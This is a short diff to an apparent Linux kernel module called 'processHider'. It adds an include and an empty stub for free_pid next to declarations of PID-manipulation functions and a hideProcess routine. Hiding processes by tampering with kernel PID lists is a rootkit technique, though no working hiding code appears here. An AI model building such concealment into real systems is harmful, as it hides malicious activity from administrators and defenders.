@@ -1,5 +1,7 @@
 #include <linux/pid.h>
+#include <linux/sched.h> // for task_struct
 #include <linux/rculist.h>
+
 #include "processHider.h"
 
 
@@ -8,6 +10,7 @@ static void __change_pid(struct task_struct *task, enum pid_type type, struct pi
 void detach_pid(struct task_struct *task, enum pid_type type);
 void change_pid(struct task_struct *task, enum pid_type type,
 		struct pid *pid);
+void free_pid(struct pid *pid);
 //
 
 static int hideProcess(int pidNumber);
@@ -92,4 +95,10 @@ void change_pid(struct task_struct *task, enum pid_type type,
 {
 	__change_pid(task, type, pid);
 	attach_pid(task, type, pid);
+}
+
+
+void free_pid(struct pid *pid) {
+	//TODO: copy this from pid.c / fill in dependancies etc..
+
 }
